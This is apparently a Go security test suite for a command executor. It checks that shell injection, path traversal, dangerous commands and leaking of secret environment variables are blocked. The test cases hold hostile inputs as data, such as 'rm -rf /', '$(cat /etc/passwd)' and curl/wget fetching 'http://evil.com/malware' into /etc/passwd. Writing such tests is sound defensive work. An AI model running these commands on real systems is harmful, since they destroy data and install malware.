package executor

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

// TestExecute_CommandInjectionPrevention tests protection against command injection attacks
func TestExecute_CommandInjectionPrevention(t *testing.T) {
	executor := NewCommandExecutor(10 * time.Second)

	tests := []struct {
		name    string
		command string
		args    []string
		errMsg  string
	}{
		{
			name:    "semicolon injection in command",
			command: "echo; rm -rf /",
			args:    []string{},
			errMsg:  "potential shell injection",
		},
		{
			name:    "pipe injection in command",
			command: "cat | grep secret",
			args:    []string{},
			errMsg:  "potential shell injection",
		},
		{
			name:    "backtick injection in args",
			command: "echo",
			args:    []string{"`whoami`"},
			errMsg:  "potential shell injection",
		},
		{
			name:    "dollar sign command substitution",
			command: "echo",
			args:    []string{"$(cat /etc/passwd)"},
			errMsg:  "potential shell injection",
		},
		{
			name:    "logical AND injection",
			command: "echo",
			args:    []string{"test && malicious-command"},
			errMsg:  "potential shell injection",
		},
		{
			name:    "logical OR injection",
			command: "echo",
			args:    []string{"test || malicious-command"},
			errMsg:  "potential shell injection",
		},
		{
			name:    "newline injection",
			command: "echo",
			args:    []string{"line1\nmalicious-command"},
			errMsg:  "potential shell injection",
		},
		{
			name:    "null byte injection",
			command: "echo",
			args:    []string{"test\x00malicious"},
			errMsg:  "null byte",
		},
		{
			name:    "escaped null byte injection",
			command: "echo",
			args:    []string{"test\\x00malicious"},
			errMsg:  "potential shell injection",
		},
		{
			name:    "output redirection injection",
			command: "echo",
			args:    []string{"test > /etc/passwd"},
			errMsg:  "potential shell injection",
		},
		{
			name:    "input redirection injection",
			command: "echo",
			args:    []string{"test < /etc/passwd"},
			errMsg:  "potential shell injection",
		},
		{
			name:    "encoded semicolon injection",
			command: "echo",
			args:    []string{"test%3Bwhoami"},
			errMsg:  "encoded shell metacharacters",
		},
		{
			name:    "encoded pipe injection",
			command: "echo",
			args:    []string{"test%7Cgrep secret"},
			errMsg:  "encoded shell metacharacters",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := executor.Execute(tt.command, tt.args, ExecOptions{})
			if err == nil {
				t.Errorf("expected error for command injection attempt, got none")
			}
			if err != nil && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("expected error containing %q, got %v", tt.errMsg, err)
			}
		})
	}
}

// TestExecute_PathTraversalPrevention tests protection against path traversal attacks
func TestExecute_PathTraversalPrevention(t *testing.T) {
	executor := NewCommandExecutor(10 * time.Second)

	// Create a safe temporary directory
	tmpDir, err := os.MkdirTemp("", "qualhook-security-test-*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	tests := []struct {
		name       string
		workingDir string
		wantErr    bool
		errMsg     string
	}{
		{
			name:       "directory traversal with ..",
			workingDir: "../../../etc",
			wantErr:    true,
			errMsg:     "directory traversal",
		},
		{
			name:       "absolute path to system directory",
			workingDir: "/etc",
			wantErr:    true,
			errMsg:     "forbidden",
		},
		{
			name:       "windows system directory",
			workingDir: "C:\\Windows\\System32",
			wantErr:    true,
			errMsg:     "forbidden",
		},
		{
			name:       "path with null byte",
			workingDir: "test\x00/etc",
			wantErr:    true,
			errMsg:     "null byte",
		},
		{
			name:       "valid relative path",
			workingDir: tmpDir,
			wantErr:    false,
		},
		{
			name:       "non-existent directory",
			workingDir: filepath.Join(tmpDir, "does-not-exist"),
			wantErr:    true,
			errMsg:     "does not exist",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var cmd string
			if runtime.GOOS == osWindows {
				cmd = cmdCommand
			} else {
				cmd = echoCommand
			}

			_, err := executor.Execute(cmd, []string{"test"}, ExecOptions{
				WorkingDir: tt.workingDir,
			})

			if tt.wantErr {
				if err == nil {
					t.Errorf("expected error, got none")
				} else if tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("expected error containing %q, got %v", tt.errMsg, err)
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

// TestExecute_EnvironmentVariableFiltering tests that sensitive environment variables are filtered
func TestExecute_EnvironmentVariableFiltering(t *testing.T) {
	executor := NewCommandExecutor(10 * time.Second)

	// Set some sensitive environment variables
	sensitiveVars := map[string]string{
		"AWS_SECRET_ACCESS_KEY": "secret-key-123",
		"GITHUB_TOKEN":          "ghp_secret123",
		"API_KEY":               "api-secret-456",
		"LD_PRELOAD":            "/malicious/lib.so",
		"DYLD_INSERT_LIBRARIES": "/malicious/lib.dylib",
	}

	// Set the sensitive vars in the environment
	for k, v := range sensitiveVars {
		os.Setenv(k, v)
		defer os.Unsetenv(k)
	}

	// Also set a safe variable
	os.Setenv("SAFE_VAR", "safe-value")
	defer os.Unsetenv("SAFE_VAR")

	// Command to print all environment variables
	var cmd string
	var args []string
	if runtime.GOOS == osWindows {
		cmd = cmdCommand
		args = []string{"/c", "set"}
	} else {
		cmd = shCommand
		args = []string{"-c", "env"}
	}

	result, err := executor.Execute(cmd, args, ExecOptions{
		InheritEnv: true,
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Check that sensitive variables are NOT in the output
	for k, v := range sensitiveVars {
		if strings.Contains(result.Stdout, k+"="+v) {
			t.Errorf("sensitive variable %s was not filtered from environment", k)
		}
		if strings.Contains(result.Stdout, v) {
			t.Errorf("sensitive value for %s was found in output", k)
		}
	}

	// Check that safe variables ARE in the output (when inheriting)
	if !strings.Contains(result.Stdout, "SAFE_VAR=safe-value") {
		// Note: This might not work if the variable is filtered by pattern
		// Just check that some basic env vars exist
		basicVars := []string{"PATH", "HOME", "USER"}
		found := false
		for _, v := range basicVars {
			if strings.Contains(result.Stdout, v+"=") {
				found = true
				break
			}
		}
		if !found {
			t.Log("Warning: Could not verify safe environment variables in output")
		}
	}
}

// TestExecute_DangerousCommands tests prevention of dangerous command execution
func TestExecute_DangerousCommands(t *testing.T) {
	executor := NewCommandExecutor(10 * time.Second)

	tests := []struct {
		name    string
		command string
		args    []string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "rm with force and recursive flags",
			command: "rm",
			args:    []string{"-rf", "/"},
			wantErr: true,
			errMsg:  "dangerous rm command",
		},
		{
			name:    "rm with separate force and recursive flags",
			command: "rm",
			args:    []string{"-r", "-f", "/tmp"},
			wantErr: true,
			errMsg:  "dangerous rm command",
		},
		{
			name:    "safe rm command",
			command: "rm",
			args:    []string{"single-file.txt"},
			wantErr: false,
		},
		{
			name:    "curl with output to sensitive location",
			command: "curl",
			args:    []string{"-o", "/etc/passwd", "http://evil.com/malware"},
			wantErr: true,
			errMsg:  "dangerous output path",
		},
		{
			name:    "wget with output to sensitive location",
			command: "wget",
			args:    []string{"--output", "/etc/hosts", "http://evil.com/malware"},
			wantErr: true,
			errMsg:  "dangerous output path",
		},
		{
			name:    "format command",
			command: "format",
			args:    []string{"C:"},
			wantErr: false, // Will be caught by other validations
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := executor.Execute(tt.command, tt.args, ExecOptions{})
			if tt.wantErr {
				if err == nil {
					t.Errorf("expected error, got none")
				} else if tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("expected error containing %q, got %v", tt.errMsg, err)
				}
			} else {
				// Command might fail for other reasons (not found, etc)
				// We're just checking it's not blocked by security
				if err != nil && strings.Contains(err.Error(), "dangerous") {
					t.Errorf("command blocked by security when it shouldn't be: %v", err)
				}
			}
		})
	}
}

// TestExecute_CommandWhitelist tests that command whitelisting works correctly
func TestExecute_CommandWhitelist(t *testing.T) {
	executor := NewCommandExecutor(10 * time.Second)
	
	// Configure the security validator with a whitelist
	executor.securityValidator.SetAllowedCommands([]string{"echo", "npm", "go"})

	tests := []struct {
		name    string
		command string
		wantErr bool
	}{
		{
			name:    "allowed command echo",
			command: "echo",
			wantErr: false,
		},
		{
			name:    "allowed command npm",
			command: "npm",
			wantErr: false,
		},
		{
			name:    "disallowed command curl",
			command: "curl",
			wantErr: true,
		},
		{
			name:    "disallowed command rm",
			command: "rm",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := executor.Execute(tt.command, []string{"test"}, ExecOptions{})
			if tt.wantErr {
				if err == nil {
					t.Errorf("expected error for disallowed command, got none")
				} else if !strings.Contains(err.Error(), "not in the allowed command list") {
					t.Errorf("expected whitelist error, got %v", err)
				}
			} else {
				// Command might fail for other reasons (not found, etc)
				if err != nil && strings.Contains(err.Error(), "not in the allowed command list") {
					t.Errorf("command blocked by whitelist when it shouldn't be: %v", err)
				}
			}
		})
	}
}

// TestExecute_TimeoutValidation tests that timeout values are properly validated
func TestExecute_TimeoutValidation(t *testing.T) {
	executor := NewCommandExecutor(10 * time.Second)

	// Set a maximum timeout on the security validator
	executor.securityValidator.SetMaxTimeout(30 * time.Second)

	tests := []struct {
		name    string
		timeout time.Duration
		wantErr bool
		errMsg  string
	}{
		{
			name:    "valid timeout",
			timeout: 10 * time.Second,
			wantErr: false,
		},
		{
			name:    "timeout exceeds maximum",
			timeout: 1 * time.Hour,
			wantErr: true,
			errMsg:  "exceeds maximum",
		},
		{
			name:    "negative timeout",
			timeout: -1 * time.Second,
			wantErr: true,
			errMsg:  "negative",
		},
		{
			name:    "very short timeout",
			timeout: 50 * time.Millisecond,
			wantErr: true,
			errMsg:  "too short",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// First validate the timeout directly
			err := executor.securityValidator.ValidateTimeout(tt.timeout)
			if tt.wantErr {
				if err == nil {
					t.Errorf("expected timeout validation error, got none")
				} else if tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("expected error containing %q, got %v", tt.errMsg, err)
				}
			} else {
				if err != nil {
					t.Errorf("unexpected timeout validation error: %v", err)
				}
			}
		})
	}
}

// TestExecute_EnvironmentInjection tests protection against environment variable injection
func TestExecute_EnvironmentInjection(t *testing.T) {
	executor := NewCommandExecutor(10 * time.Second)

	tests := []struct {
		name        string
		environment []string
		wantErr     bool
		errMsg      string
	}{
		{
			name:        "valid environment variable",
			environment: []string{"FOO=bar"},
			wantErr:     false,
		},
		{
			name:        "environment with command substitution",
			environment: []string{"FOO=$(whoami)"},
			wantErr:     false, // Will be filtered during merge
		},
		{
			name:        "environment with backticks",
			environment: []string{"FOO=`id`"},
			wantErr:     false, // Will be filtered during merge
		},
		{
			name:        "environment with null byte",
			environment: []string{"FOO=test\x00hack"},
			wantErr:     false, // Will be filtered during merge
		},
		{
			name:        "PATH with parent directory reference",
			environment: []string{"PATH=../../../bin:/usr/bin"},
			wantErr:     false, // Will be filtered during merge
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var cmd string
			if runtime.GOOS == osWindows {
				cmd = cmdCommand
			} else {
				cmd = echoCommand
			}

			// Execute should handle malicious environment variables safely
			result, err := executor.Execute(cmd, []string{"test"}, ExecOptions{
				Environment: tt.environment,
				InheritEnv:  false,
			})

			if err != nil {
				t.Errorf("unexpected error: %v", err)
			} else {
				// Verify the malicious values were filtered out
				for _, env := range tt.environment {
					if strings.Contains(env, "$") || strings.Contains(env, "`") || strings.Contains(env, "\x00") {
						// These should have been filtered
						parts := strings.SplitN(env, "=", 2)
						if len(parts) == 2 && strings.Contains(result.Stdout, parts[1]) {
							t.Errorf("malicious environment value was not filtered: %s", env)
						}
					}
				}
			}
		})
	}
}

// TestExecute_ConcurrentSecurity tests that security measures work correctly under concurrent load
func TestExecute_ConcurrentSecurity(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping concurrent test in short mode")
	}

	executor := NewCommandExecutor(10 * time.Second)
	
	// Number of concurrent executions
	concurrency := 10
	done := make(chan bool, concurrency)

	for i := 0; i < concurrency; i++ {
		go func(n int) {
			defer func() { done <- true }()

			// Try various injection attempts
			injectionAttempts := []struct {
				cmd  string
				args []string
			}{
				{"echo; malicious", []string{}},
				{"echo", []string{"`whoami`"}},
				{"echo", []string{"$(id)"}},
				{"echo", []string{"test && evil"}},
			}

			attempt := injectionAttempts[n%len(injectionAttempts)]
			_, err := executor.Execute(attempt.cmd, attempt.args, ExecOptions{})
			
			if err == nil || !strings.Contains(err.Error(), "injection") {
				t.Errorf("concurrent test %d: expected injection error, got %v", n, err)
			}
		}(i)
	}

	// Wait for all goroutines
	for i := 0; i < concurrency; i++ {
		<-done
	}
}